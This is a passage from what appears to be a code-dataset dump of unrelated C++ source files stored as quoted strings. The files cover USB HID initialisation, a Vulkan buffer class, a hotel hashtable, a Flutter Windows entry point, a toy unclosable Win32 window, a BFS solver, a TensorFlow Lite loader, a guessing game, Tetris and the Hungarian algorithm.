id) {\n\tif(!bHasReportId)\n\t\treturn ((rptParsers[0].rptParser) ? rptParsers[0].rptParser : NULL);\n\n\tfor(uint8_t i = 0; i < MAX_REPORT_PARSERS; i++) {\n\t\tif(rptParsers[i].rptId == id)\n\t\t\treturn rptParsers[i].rptParser;\n\t}\n\treturn NULL;\n}\n\nuint32_t HIDUniversal::Init(uint32_t parent, uint32_t port, uint32_t lowspeed) {\n\tconst uint8_t constBufSize = sizeof (USB_DEVICE_DESCRIPTOR);\n\n\tuint8_t buf[constBufSize];\n\tUSB_DEVICE_DESCRIPTOR * udd = reinterpret_cast<USB_DEVICE_DESCRIPTOR*>(buf);\n\tuint8_t rcode;\n\tUsbDeviceDefinition *p = NULL;\n\tEpInfo *oldep_ptr = NULL;\n\tuint8_t len = 0;\n\n\tuint8_t num_of_conf; // number of configurations\n\t//uint8_t\t\tnum_of_intf;\t// number of interfaces\n\n\tAddressPool &addrPool = pUsb->GetAddressPool();\n\n\tUSBTRACE(\"HU Init\\r\\n\");\n\n\tif(bAddress)\n\t\treturn USB_ERROR_CLASS_INSTANCE_ALREADY_IN_USE;\n\n\t// Get pointer to pseudo device with address 0 assigned\n\tp = addrPool.GetUsbDevicePtr(0);\n\n\tif(!p)\n\t\treturn USB_ERROR_ADDRESS_NOT_FOUND_IN_POOL;\n\n\tif(!p->epinfo) {\n\t\tUSBTRACE(\"epinfo\\r\\n\");\n\t\treturn USB_ERROR_EPINFO_IS_NULL;\n\t}\n\n\t// Save old pointer to EP_RECORD of address 0\n\toldep_ptr = p->epinfo;\n\n\t// Temporary assign new pointer to epInfo to p->epinfo in order to avoid toggle inconsistence\n\tp->epinfo = epInfo;\n\n\tp->lowspeed = lowspeed;\n\n\t// Get device descriptor\n\trcode = pUsb->getDevDescr(0, 0, 8, (uint8_t*)buf);\n\n\tif(!rcode)\n\t\tlen = (buf[0] > constBufSize) ? constBufSize : buf[0];\n\n\tif(rcode) {\n\t\t// Restore p->epinfo\n\t\tp->epinfo = oldep_ptr;\n\n\t\tgoto FailGetDevDescr;\n\t}\n\n\t// Restore p->epinfo\n\tp->epinfo = oldep_ptr;\n\n\t// Allocate new address according to device class\n\tbAddress = addrPool.AllocAddress(parent, false, port);\n\n\tif(!bAddress)\n\t\treturn USB_ERROR_OUT_OF_ADDRESS_SPACE_IN_POOL;\n\n\t// Extract Max Packet Size from the device descriptor\n\tepInfo[0].maxPktSize = udd->bMaxPacketSize0;\n\n\t// Assign new address to the device\n\trcode = pUsb->setAddr(0, 0, bAddress);\n\n\tif(rcode) {\n\t\tp->lowspeed = false;\n\t\taddrPool.FreeAddress(bAddress);\n\t\tbAddress = 0;\n\t\tUSBTRACE2(\"setAddr:\", rcode);\n\t\treturn rcode;\n\t}\n\n\t//delay(2); //per USB 2.0 sect.9.2.6.3\n\n\tUSBTRACE2(\"Addr:\", bAddress);\n\n\tp->lowspeed = false;\n\n\tp = addrPool.GetUsbDevicePtr(bAddress);\n\n\tif(!p)\n\t\treturn USB_ERROR_ADDRESS_NOT_FOUND_IN_POOL;\n\n\tp->lowspeed = lowspeed;\n\n\tif(len)\n\t\trcode = pUsb->getDevDescr(bAddress, 0, len, (uint8_t*)buf);\n\n\tif(rcode)\n\t\tgoto FailGetDevDescr;\n\n\tVID = udd->idVendor; // Can be used by classes that inherits this class to check the VID and PID of the connected device\n\tPID = udd->idProduct;\n\tUSBTRACE2(\"VID:\", VID);\n\tUSBTRACE2(\"PID:\", PID);\n\n\tnum_of_conf = udd->bNumConfigurations;\n\n\t// Assign epInfo to epinfo pointer\n\trcode = pUsb->setEpInfoEntry(bAddress, 1, epInf",
    "#include \"Buffer.hpp\"\n\n#include \"drawing/CommandBuffer.hpp\"\n\nBuffer::Buffer( Device& device, VkDeviceSize size, VkBufferUsageFlags usage, VkMemoryPropertyFlags properties )\n    : device( device )\n{\n    VkBufferCreateInfo bufferInfo{};\n    bufferInfo.sType = VK_STRUCTURE_TYPE_BUFFER_CREATE_INFO;\n    bufferInfo.size = size;\n    bufferInfo.usage = usage;\n    bufferInfo.sharingMode = VK_SHARING_MODE_EXCLUSIVE;\n\n    if( vkCreateBuffer( device, &bufferInfo, nullptr, &buffer ) != VK_SUCCESS )\n    {\n        throw std::runtime_error( \"failed to create buffer!\" );\n    }\n\n    VkMemoryRequirements memRequirements;\n    vkGetBufferMemoryRequirements( device, buffer, &memRequirements );\n\n    VkMemoryAllocateInfo allocInfo{};\n    allocInfo.sType = VK_STRUCTURE_TYPE_MEMORY_ALLOCATE_INFO;\n    allocInfo.allocationSize = memRequirements.size;\n    allocInfo.memoryTypeIndex = findMemoryType( device, memRequirements.memoryTypeBits, properties );\n\n    if( vkAllocateMemory( device, &allocInfo, nullptr, &bufferMemory ) != VK_SUCCESS )\n    {\n        throw std::runtime_error( \"failed to allocate vertex buffer memory!\" );\n    }\n\n    vkBindBufferMemory( device, buffer, bufferMemory, 0 );\n}\n\nBuffer::~Buffer()\n{\n    vkDestroyBuffer( device, buffer, nullptr );\n    vkFreeMemory( device, bufferMemory, nullptr );\n}\n\nvoid Buffer::mapMemory( VkDeviceSize offset, VkDeviceSize size, VkMemoryMapFlags flags )\n{\n    bufferMemoryMap = std::make_unique< BufferMemoryMap >( device, bufferMemory, offset, size, flags );\n}\n\nvoid Buffer::copyTo( const void* data )\n{\n    if( bufferMemoryMap == nullptr )\n    {\n        std::runtime_error( \"Buffer not mapped!\" );\n    }\n    bufferMemoryMap->copy( data );\n}\n\nvoid Buffer::unmapMemory() { bufferMemoryMap.reset(); }\n\nuint32_t Buffer::findMemoryType( Device& device, uint32_t typeFilter, VkMemoryPropertyFlags properties )\n{\n    VkPhysicalDeviceMemoryProperties memProperties;\n    vkGetPhysicalDeviceMemoryProperties( device, &memProperties );\n    for( uint32_t i = 0; i < memProperties.memoryTypeCount; i++ )\n    {\n        if( ( typeFilter & ( 1 << i ) ) && ( memProperties.memoryTypes[i].propertyFlags & properties ) == properties )\n        {\n            return i;\n        }\n    }\n\n    throw std::runtime_error( \"failed to find suitable memory type!\" );\n}\n\nvoid Buffer::copyBuffer( Device& device, Buffer& srcBuffer, Buffer& dstBuffer, VkDeviceSize size )\n{\n    VkCommandBuffer commandBuffer = CommandBuffer::beginSingleTimeCommands( device );\n\n    VkBufferCopy copyRegion{};\n    copyRegion.srcOffset = 0;\n    copyRegion.dstOffset = 0;\n    copyRegion.size = size;\n    vkCmdCopyBuffer( commandBuffer, srcBuffer, dstBuffer, 1, &copyRegion );\n\n    CommandBuffer::endSingleTimeCommands( device, commandBuffer );\n}",
    "#include \"hashtable.hpp\"\n\n// Constructor\nHashTable::HashTable(int capacity) : size(0), capacity(capacity), collisions(0) {\n    buckets = new list<Entry>[capacity];\n}\n\n// hash function to calculate the index for a given key\nunsigned long HashTable::hashCode(string key) {\n    unsigned long hash = 5381;  // Initial value\n\n    for (char ch : key) {\n        hash = ((hash << 5) + hash) + ch;  // I]t improved hash algorithm\n    }\n\n    return hash % capacity;\n}\n\n\n// find a hotel with a given key in the hashtable\nHotel* HashTable::find(string key, bool printstatement) {\n    unsigned long index = hashCode(key);\n    int comparisons = 0;\n\n    // iterate through the linked list at the index given\n    for (auto& entry : buckets[index]) {\n        comparisons++;\n        if (entry.key == key) {\n            // if the Hotel found, give the comparisons\n            if (printstatement == true) {\n                cout << \"Record found after \" << comparisons << \" comparison(s)\" << endl;\n            }\n            return entry.value;\n        }\n    }\n\n    // Hotel not found (this will be printed only if the loop completes without finding the hotel)\n    cout << \"Record not found.\" << endl;\n    return nullptr;\n}\n\n// find the hotel in th especific city with the stars (if given)\nvoid HashTable::findAll(string city, string stars) {\n    // search for the city in the BST\n    Node<string, Hotel*>* result = cityRecords.find(cityRecords.getRoot(), city, stars);\n    if (result != nullptr) {\n    } else {\n        cout << \"No record found!\" << endl;\n    }\n}\n\n// insert a hotel with a given key and value into the hashtable\nvoid HashTable::insert(string key, Hotel* value) {\n    unsigned long index = hashCode(key);\n    bool isFound = false;\n\n    // iterate through the linked list at the index found \n    for (auto& entry : buckets[index]) {\n        if (entry.key == key) {\n            // if entry with key is found \n            entry.value = value;\n            isFound = true;\n            cout << \"Existing record has been updated\" << endl;\n            break;\n        }\n    }\n\n    // check for collisions and update the collision count\n    if (!buckets[index].empty()) {\n        collisions++;\n    }\n\n    // if entry with given key is not found, create a new entry and add it to the linked list\n    if (!isFound) {\n        Entry newEntry(key, value);\n        buckets[index].push_back(newEntry);\n\n        // get the city name from the key and insert the hotel into the BST\n        size_t commaPos = key.find(\",\");\n        if (commaPos != string::npos) {\n            string cityname = key.substr(commaPos + 1);\n            cityRecords.insert(cityRecords.getRoot(), cityname, value);\n        }\n\n        //increase the size of the hashtable\n        size++;\n    }\n}\n\n// erase hotel with a given key from the hashtable\nvoid HashTable::erase(string key) {\n    unsigned long index = hashCode(key);\n\n    // iterate through the linked list at the index found\n    auto it = buckets[index].begin();\n    while (it != buckets[index].end()) {\n        //check if current key entry is same as target key\n        if (it->key == key) {\n            // find the hotel in that key\n            Hotel* tobeDeleted = find(key, false);\n            //check if it not empty\n            if (tobeDeleted != nullptr){\n                //separate the cityname from hotel name\n                size_t commaPos = key.find(\",\");\n                if (commaPos != string::npos) {\n                    string cityname = key.substr(commaPos + 1);\n                    // remove from the associated BST\n                    cityRecords.remove(cityRecords.getRoot(), cityname, tobeDeleted);\n                }\n                cout << \"Hotel \\\"\" << key << \"\\\" deleted successfully.\" << endl;\n            }\n\n            else{\n                cout << \"Hotel not found.\" << endl;\n            }\n\n            auto value = it->value;\n            // remove it from the hashtable\n            it = buckets[index].erase(it);\n            //decrease size of hashtable\n            size--;\n            return;\n        } else {\n            //else movd to next key\n            ++it;\n        }\n    }\n    // when key not found\n    cerr << \"Warning: Hotel with key \\\"\" << key << \"\\\" not found.\" << endl;\n}\n\n// to get the current size of the hashtable\nunsigned int HashTable::getSize() {\n    return size;\n}\n\n// for total number of collisions\nunsigned int HashTable::getCollisions() {\n    return collisions;\n}\n\n// Dump the hashtable entries to a text file\nvoid HashTable::dump(string path) {\n    // open the output file to write in it\n    ofstream outfile(path);\n    if (outfile.is_open()) {\n        // iterate through each bucket and each entry that we are putting in file\n        for (unsigned int i = 0; i < capacity; ++i) {\n            for (const Entry& entry : buckets[i]) {\n                outfile << entry.key << \" \" << entry.value->toString() << endl;\n            }\n        }\n        // close output file\n        outfile.close();\n    } else {\n        //error if the file cannot ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"responsive_dashboard\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*This program is by Jacky Zhu.\r\nHe got some help from AI.*/\r\n\r\n#include <windows.h>\r\nLRESULT CALLBACK WindowProcedure(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)\r\n{\r\n    switch (msg)\r\n    {\r\n        case WM_CLOSE:\r\n            return 0;\r\n        case WM_DESTROY:\r\n            PostQuitMessage(0);\r\n            return 0;\r\n    }\r\n    return DefWindowProc(hwnd, msg, wParam, lParam);\r\n}\r\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)\r\n{\r\n    FreeConsole();\r\n    WNDCLASSEX wcex;\r\n    HWND hwnd;\r\n    MSG msg;\r\n    wcex.cbSize = sizeof(WNDCLASSEX);\r\n    wcex.style = CS_HREDRAW | CS_VREDRAW;\r\n    wcex.lpfnWndProc = WindowProcedure;\r\n    wcex.cbClsExtra = 0;\r\n    wcex.cbWndExtra = 0;\r\n    wcex.hInstance = hInstance;\r\n    wcex.hIcon = LoadIcon(NULL, IDI_APPLICATION);\r\n    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);\r\n    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);\r\n    wcex.lpszMenuName = NULL;\r\n    wcex.lpszClassName = \"UnclosableWindowClass\";\r\n    wcex.hIconSm = LoadIcon(NULL, IDI_APPLICATION);\r\n    if (!RegisterClassEx(&wcex))\r\n    {\r\n        MessageBox(NULL, \"Window Registration Failed!\", \"Error!\", MB_ICONEXCLAMATION | MB_OK);\r\n        return 0;\r\n    }\r\n    hwnd = CreateWindow(\"UnclosableWindowClass\", \"Unclosable Window\", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 500, 500, NULL, NULL, hInstance, NULL);\r\n    if (!hwnd)\r\n    {\r\n        MessageBox(NULL, \"Window Creation Failed!\", \"Error!\", MB_ICONEXCLAMATION | MB_OK);\r\n        return 0;\r\n    }\r\n    ShowWindow(hwnd, nCmdShow);\r\n    UpdateWindow(hwnd);\r\n    while (GetMessage(&msg, NULL, 0, 0))\r\n    {\r\n        TranslateMessage(&msg);\r\n        DispatchMessage(&msg);\r\n    }\r\n    return msg.wParam;\r\n}\r\n",
    "#include <bits/stdc++.h>\r\n\r\nusing namespace std;\r\n\r\nvoid bfs(int start, int end, const vector<vector<int>>& adj, vector<int>& distances) {\r\n    queue<int> q;\r\n    q.push(start);\r\n    distances[start] = 0;\r\n\r\n    while (!q.empty()) {\r\n        int node = q.front();\r\n        q.pop();\r\n\r\n        for (int neighbor : adj[node]) {\r\n            if (distances[neighbor] == INT_MAX) { \r\n                distances[neighbor] = distances[node] + 1;\r\n                q.push(neighbor);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    int T;\r\n    cin >> T;\r\n\r\n    while (T--) {\r\n        int N, Q;\r\n        cin >> N >> Q;\r\n        \r\n        vector<int> A(N);\r\n        for (int i = 0; i < N; ++i) {\r\n            cin >> A[i];\r\n        }\r\n        \r\n        vector<vector<int>> adj(N + 1); \r\n        for (int i = 1; i <= N; ++i) {\r\n            for (int j = 1; j <= A[i - 1]; ++j) {\r\n                if (i + j <= N) {\r\n                    adj[i].push_back(i + j);\r\n                }\r\n            }\r\n        }\r\n\r\n        while (Q--) {\r\n            int X, Y;\r\n            cin >> X >> Y;\r\n\r\n            vector<int> distances(N + 1, INT_MAX); \r\n            bfs(X, Y, adj, distances);\r\n\r\n            if (distances[Y] == INT_MAX) {\r\n                cout << -1 << endl;\r\n            } else {\r\n                cout << distances[Y] << endl;\r\n            }\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\r\n#include \"tensorflow/lite/model.h\"\r\n#include \"tensorflow/lite/interpreter.h\"\r\n#include \"tensorflow/lite/kernels/register.h\"\r\n#include \"tensorflow/lite/delegates/flex/delegate.h\"\r\nusing namespace std;\r\nint main() {\r\n    // Load the model\r\n    cout << \"Top Rishik\" << endl;\r\n    std::unique_ptr<tflite::FlatBufferModel> model = tflite::FlatBufferModel::BuildFromFile(\"../auto.tflite\");\r\n    if (!model) {\r\n        std::cerr << \"Failed to load model\" << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    // Create an interpreter\r\n    tflite::ops::builtin::BuiltinOpResolver resolver;\r\n    std::unique_ptr<tflite::Interpreter> interpreter;\r\n    tflite::InterpreterBuilder(*model, resolver)(&interpreter);\r\n    if (!interpreter) {\r\n        std::cerr << \"Failed to create interpreter\" << std::endl;\r\n        return -1;\r\n    }\r\n    \r\n    //tflite::InterpreterBuilder::ApplyDelegates(interpreter);\r\n    cout << \"Rishik\" << endl;\r\n    ////// Create the Flex delegate\r\n    //TfLiteDelegate flex_delegate = TfLiteDelegateCreate();\r\n    //if (!flex_delegate) {\r\n    //    std::cerr << \"Failed to create Flex delegate\" << std::endl;\r\n    //    return -1;\r\n    //}\r\n\r\n    /*TfLiteDelegate* flex_delegate = create_flex_delegate();\r\n    if (interpreter->ModifyGraphWithDelegate(flex_delegate) != kTfLiteOk) {\r\n        std::cerr << \"Failed to modify graph with Flex Delegate.\" << std::endl;\r\n        return -1;\r\n    }*/\r\n\r\n    //////// Add Flex delegate to the interpreter\r\n    //if (interpreter->ModifyGraphWithDelegate(flex_delegate) != kTfLiteOk) {\r\n    //    std::cerr << \"Failed to apply Flex delegate\" << std::endl;\r\n    //    TfLiteOpaqueDelegateDelete(flex_delegate);  // Clean up delegate if ModifyGraph fails\r\n    //    return -1;\r\n    //}\r\n\r\n    // Allocate tensors\r\n    if (interpreter->AllocateTensors() != kTfLiteOk) {\r\n        std::cerr << \"Failed to allocate tensors\" << std::endl;\r\n        //TfLiteOpaqueDelegateDelete(flex_delegate);  // Clean up delegate if tensor allocation fails\r\n        return -1;\r\n    }\r\n\r\n    ////// Run inference\r\n    ////if (interpreter->Invoke() != kTfLiteOk) {\r\n    ////    std::cerr << \"Failed to invoke interpreter\" << std::endl;\r\n    ////    TfLiteOpaqueDelegateDelete(flex_delegate);  // Clean up delegate if invocation fails\r\n    ////    return -1;\r\n    ////}\r\n\r\n    //std::cout << \"Model executed successfully with Flex delegate!\" << std::endl;\r\n\r\n    //// Clean up delegate\r\n    ////TfLiteOpaqueDelegateDelete(flex_delegate);\r\n    cout << \"Rishik\" << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <cstdlib> // for rand() and srand()\n#include <ctime> //time()\n\nint createRandNum(){\n\n    srand(time(0)); // Seed validation for creating randNum\n    return(rand() %100) + 1; //Create randNum between 1 and 100\n}\n\nvoid guessCheck(int randNum, int attempt){\n\n    int* guesses = new int[attempt];\n    int userGuess;\n    bool correctGuess = false; //At first, this is zero.\n    int guessCount = 0;\n    while(attempt > 0 && !correctGuess){\n\n        std::cout<<\"Guess a number: \" << \"You have \"<<attempt<<\" rights left: \";\n        std::cin>>userGuess;\n        guesses[guessCount] = userGuess;\n        guessCount++;\n\n        if(userGuess < randNum){\n            std::cout <<\"Guess bigger number.\"<< std::endl;\n        } else if(userGuess > randNum){\n            std::cout <<\"Guess smaller number.\"<< std::endl;\n        } else{\n            std::cout <<\"Congrats! Right guess.\"<< std::endl;\n            correctGuess = true;\n        } \n        attempt--;\n    }\n\n        if (!correctGuess)\n        {\n            std::cout <<\"YOUR GUESS RIGHTS HAVE ENDED! Correct number is: \"<< randNum << std::endl;\n        }\n        \n    std::cout<<\"Guesses made: \";\n    for(int i = 0 ; i < guessCount ; i++){\n        std::cout<< guesses[i] << \" \";\n    }\n    std::cout<<std::endl;\n\n    delete[] guesses; // free to dynamic mem\n\n}\n\n\n\nint main(){\n    char playAgain;\n    \n    do {\n        int randNum = createRandNum();\n        int attempt = 5;\n        guessCheck(randNum, attempt);\n\n        std::cout << \"Do you want to play again? (y/n): \";\n        std::cin >> playAgain;\n    } while(playAgain == 'Y' || playAgain == 'y'); \n\n    std::cout << \"The game is over!\" << std::endl;\n\n    return 0;\n}",
    "#include <graphics.h>\r\n#include <conio.h>\r\n#include <stdlib.h>\r\n#include <time.h>\r\n\r\nconst int M = 20; // Number of rows\r\nconst int N = 10; // Number of columns\r\n\r\nint field[M][N] = {0}; // Game field\r\nint score = 0; // Score variable\r\n\r\nstruct Point {\r\n    int x, y;\r\n} a[4], b[4]; // Current and previous figure points\r\n\r\n// Figures represented in a 2D array\r\nint figures[7][4] = {\r\n    1, 3, 5, 7, // I\r\n    2, 4, 5, 7, // Z\r\n    3, 5, 4, 6, // S\r\n    3, 5, 4, 7, // T\r\n    2, 3, 5, 7, // L\r\n    3, 5, 7, 6, // J\r\n    2, 3, 4, 5  // O\r\n};\r\n\r\n// Function to check if the figure can be placed\r\nbool check() {\r\n    for (int i = 0; i < 4; i++) {\r\n        if (a[i].x < 0 || a[i].x >= N || a[i].y >= M)\r\n            return false;\r\n        else if (field[a[i].y][a[i].x])\r\n            return false;\r\n    }\r\n    return true;\r\n}\r\n\r\n// Function to draw the playing field\r\nvoid drawField() {\r\n    setfillstyle(SOLID_FILL, LIGHTGRAY);\r\n    for (int i = 0; i < M; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            if (field[i][j]) {\r\n                setcolor(field[i][j]);\r\n                rectangle(j * 20 + 50, i * 20 + 50, j * 20 + 70, i * 20 + 70);\r\n                floodfill(j * 20 + 55, i * 20 + 55, field[i][j]);\r\n            } else {\r\n                setcolor(WHITE);\r\n                rectangle(j * 20 + 50, i * 20 + 50, j * 20 + 70, i * 20 + 70);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n// Function to draw the current active figure\r\nvoid drawFigure(int colorNum) {\r\n    setfillstyle(SOLID_FILL, colorNum);\r\n    for (int i = 0; i < 4; i++) {\r\n        int x = a[i].x * 20 + 50;\r\n        int y = a[i].y * 20 + 50;\r\n        setcolor(colorNum);\r\n        rectangle(x, y, x + 20, y + 20);\r\n        floodfill(x + 5, y + 5, colorNum);\r\n    }\r\n}\r\n\r\n// Function to hard drop the figure\r\nvoid hardDrop() {\r\n    while (true) {\r\n        for (int i = 0; i < 4; i++) {\r\n            b[i] = a[i];\r\n            a[i].y += 1;\r\n        }\r\n        if (!check()) {\r\n            for (int i = 0; i < 4; i++)\r\n                a[i] = b[i]; // Revert to the last valid position\r\n            break;\r\n        }\r\n    }\r\n}\r\n\r\n// Function to check if a row is completely filled\r\nbool isRowFilled(int row) {\r\n    for (int j = 0; j < N; j++) {\r\n        if (field[row][j] == 0) {\r\n            return false; // Found an empty cell in the row\r\n        }\r\n    }\r\n    return true; // Row is completely filled\r\n}\r\n\r\n// Function to clear filled rows and update score\r\nvoid clearFilledRows() {\r\n    int clearedRows = 0; // Count of cleared rows\r\n    for (int row = M - 1; row >= 0; row--) {\r\n        if (isRowFilled(row)) { // Check if the current row is filled\r\n            // Clear the filled row\r\n            for (int j = 0; j < N; j++) {\r\n                field[row][j] = 0; \r\n            }\r\n            clearedRows++; // Increment cleared row count\r\n            \r\n            // Shift down rows above the cleared row\r\n            for (int k = row - 1; k >= 0; k--) {\r\n                for (int j = 0; j < N; j++) {\r\n                    field[k + 1][j] = field[k][j]; // Shift down\r\n                }\r\n            }\r\n            // Clear the original row position after moving\r\n            for (int j = 0; j < N; j++) {\r\n                field[row][j] = 0; // Ensure the cleared row is empty\r\n            }\r\n            row++; // Check this row again after moving\r\n        }\r\n    }\r\n    \r\n    // Update score based on the number of cleared rows\r\n    if (clearedRows > 0) {\r\n        score += clearedRows * 10; // Increment score by 10 for each cleared row\r\n    }\r\n}\r\n\r\n// Function to check if the game is over\r\nbool isGameOver() {\r\n    for (int i = 0; i < N; i++) {\r\n        if (field[0][i] != 0)\r\n            return true;\r\n    }\r\n    return false;\r\n}\r\n\r\n// Function to show the \"Game Over\" message and final score\r\nvoid displayGameOverMessage() {\r\n    cleardevice();\r\n\r\n    // Display final score\r\n    char finalScoreText[30];\r\n    sprintf(finalScoreText, \"Final Score: %d\", score);\r\n    setcolor(WHITE);\r\n    settextstyle(10, 0, 4); // Set text style for the final score\r\n    outtextxy(150, 150, finalScoreText); // Print final score above \"Game Over\"\r\n\r\n    // Display \"Game Over\" message\r\n    setcolor(RED);\r\n    settextstyle(10, 0, 5); // Set text style for the \"Game Over\" message\r\n    outtextxy(150, 200, \"GAME OVER\");\r\n\r\n    // Display menu for restarting or quitting\r\n    setcolor(WHITE);\r\n    settextstyle(10, 0, 2);\r\n    outtextxy(150, 300, \"Press R to Restart\");\r\n    outtextxy(150, 350, \"Press Q to Quit\");\r\n\r\n    // Wait for user input to restart or quit\r\n    while (true) {\r\n        if (GetAsyncKeyState('R')) break;  // Restart if 'R' is pressed\r\n        else if (GetAsyncKeyState('Q')) {\r\n            closegraph();\r\n            exit(0);  // Quit if 'Q' is pressed\r\n        }\r\n    }\r\n}\r\n// Function to reset the game board\r\nvoid resetGame() {\r\n    score = 0; // Reset score\r\n    for (int i = 0; i < M; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            field[i][j] = 0;\r\n        }\r\n    }\r\n}\r\n\r\n// Function to che",
    "#include \"hungarian.h\"\n#include <algorithm>\n#include <limits>\n#include <tuple>\n#include <set>\n#include <numeric>\n#include <iostream>\n\nusing namespace std;\n\n// \u6269\u5c55\u4ee3\u4ef7\u77e9\u9635\u4e3a\u65b9\u9635\nvector<vector<float>> pad_cost_matrix(const vector<vector<float>>& cost_matrix) {\n    int n = cost_matrix.size();\n    int m = cost_matrix[0].size();\n    vector<vector<float>> padded_cost_matrix;\n\n    if (n == m) {\n        return cost_matrix;\n    }\n\n    if (n < m) {\n        padded_cost_matrix = cost_matrix;\n        vector<float> padding(m, numeric_limits<float>::max());\n        for (int i = 0; i < m - n; ++i) {\n            padded_cost_matrix.push_back(padding);\n        }\n    }\n\n    return padded_cost_matrix;\n}\n\n// \u5308\u7259\u5229\u7b97\u6cd5\npair<float, vector<pair<int, int>>> hungarian_algorithm(vector<vector<float>>& cost_matrix) {\n    int n = cost_matrix.size();\n    int m = cost_matrix[0].size();\n    vector<vector<float>> origin_cost_matrix = cost_matrix;\n\n    // \u6269\u5c55\u77e9\u9635\u4e3a\u65b9\u9635\n    cost_matrix = pad_cost_matrix(cost_matrix);\n    n = cost_matrix.size();\n    m = cost_matrix[0].size();\n\n    // \u6bcf\u884c\u51cf\u53bb\u6700\u5c0f\u503c\n    for (int i = 0; i < n; ++i) {\n        float min_value = *min_element(cost_matrix[i].begin(), cost_matrix[i].end());\n        for (int j = 0; j < m; ++j) {\n            cost_matrix[i][j] -= min_value;\n        }\n    }\n\n    // \u6bcf\u5217\u51cf\u53bb\u6700\u5c0f\u503c\n    for (int j = 0; j < m; ++j) {\n        float min_value = numeric_limits<float>::max();\n        for (int i = 0; i < n; ++i) {\n            min_value = min(min_value, cost_matrix[i][j]);\n        }\n        for (int i = 0; i < n; ++i) {\n            cost_matrix[i][j] -= min_value;\n        }\n    }\n\n    vector<vector<bool>> star_matrix(n, vector<bool>(m, false));\n    vector<vector<bool>> prime_matrix(n, vector<bool>(m, false));\n    vector<bool> row_covered(n, false);\n    vector<bool> col_covered(m, false);\n\n    // \u6807\u8bb0\u6bcf\u4e00\u884c\u4e2d\u7684\u7b2c\u4e00\u4e2a\u96f6\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < m; ++j) {\n            if (cost_matrix[i][j] == 0 && !row_covered[i] && !col_covered[j]) {\n                star_matrix[i][j] = true;\n                row_covered[i] = true;\n                col_covered[j] = true;\n            }\n        }\n    }\n\n    fill(row_covered.begin(), row_covered.end(), false);\n    fill(col_covered.begin(), col_covered.end(), false);\n\n    // \u8986\u76d6\u6bcf\u4e00\u5217\u4e2d\u6709\u661f\u53f7\u7684\u5217\n    auto cover_columns_with_stars = [&]() {\n        for (int i = 0; i < n; ++i) {\n            for (int j = 0; j < m; ++j) {\n                if (star_matrix[i][j]) {\n                    col_covered[j] = true;\n                }\n            }\n        }\n    };\n    cover_columns_with_stars();\n\n    auto find_zero = [&]() {\n        for (int i = 0; i < n; ++i) {\n            if (!row_covered[i]) {\n                for (int j = 0; j < m; ++j) {\n                    if (cost_matrix[i][j] == 0 && !col_covered[j]) {\n                        return make_pair(i, j);\n                    }\n                }\n            }\n        }\n        return make_pair(-1, -1);\n    };\n\n    auto find_star_in_row = [&](int row) {\n        for (int j = 0; j < m; ++j) {\n            if (star_matrix[row][j]) {\n                return j;\n            }\n        }\n        return -1;\n    };\n\n    auto find_prime_in_row = [&](int row) {\n        for (int j = 0; j < m; ++j) {\n            if (prime_matrix[row][j]) {\n                return j;\n            }\n        }\n        return -1;\n    };\n\n    auto augment_path = [&](vector<pair<int, int>>& path) {\n        for (const auto& p : path) {\n            star_matrix[p.first][p.second] = !star_matrix[p.first][p.second];\n        }\n    };\n\n    auto adjust_cost_matrix = [&]() {\n        float min_uncovered_value = numeric_limits<float>::max();\n        for (int i = 0; i < n; ++i) {\n            for (int j = 0; j < m; ++j) {\n                if (!row_covered[i] && !col_covered[j]) {\n                    min_uncovered_value = min(min_uncovered_value, cost_matrix[i][j]);\n                }\n            }\n        }\n        for (int i = 0; i < n; ++i) {\n            if (row_covered[i]) {\n                for (int j = 0; j < m; ++j) {\n                    cost_matrix[i][j] += min_uncovered_value;\n                }\n            }\n        }\n        for (int j = 0; j < m; ++j) {\n            if (!col_covered[j]) {\n                for (int i = 0; i < n; ++i) {\n                    cost_matrix[i][j] -= min_uncovered_value;\n                }\n            }\n        }\n    };\n\n    while (count(col_covered.begin(), col_covered.end(), true) < min(n, m)) {\n        auto [row, col] = find_zero();\n        if (row == -1) { // \u6ca1\u6709\u672a\u8986\u76d6\u7684\u96f6\uff0c\u8c03\u6574\u4ee3\u4ef7\u77e9\u9635\n            adjust_cost_matrix();\n            tie(row, col) = find_zero();\n        }\n\n        prime_matrix[row][col] = true;\n        int star_col = find_star_in_row(row);\n        if (star_col == -1) {\n            // \u589e\u5e7f\u8def\u5f84\n            vector<pair<int, int>> path;\n            path.emplace_back(row, col);\n            while (true) {\n                int 